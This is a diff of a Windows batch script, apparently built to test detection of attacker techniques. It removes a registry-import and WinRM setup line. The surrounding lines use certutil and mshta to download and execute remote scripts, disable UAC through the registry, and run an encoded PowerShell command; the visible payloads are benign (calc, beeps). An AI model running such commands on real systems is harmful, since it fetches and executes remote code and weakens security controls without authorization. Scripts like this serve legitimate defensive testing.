@@ -258,8 +258,6 @@ certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/
 ECHO ============================
 mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
 ECHO ============================
-reg.exe import c:\path\to\Slmgr.reg & winrm quickconfig
-ECHO ============================
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 ECHO ============================
 cmd.exe /c powershell.exe -EncodedCommand ZgBvAHIAKAAkAHgAIAA9ACAAMQAwADAAMAA7ACAAJAB4ACAALQBsAHQAIAAxADIAMAAwADAAOwAgACQAeAArAD0AMQAwADAAMAApACAAewAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgBzAG8AbABlAF0AOgA6AEIAZQBlAHAAKAAkAHgALAAgADMAMAAwACkAOwAgACIAJAB4ACAASAB6ACIAfQA=
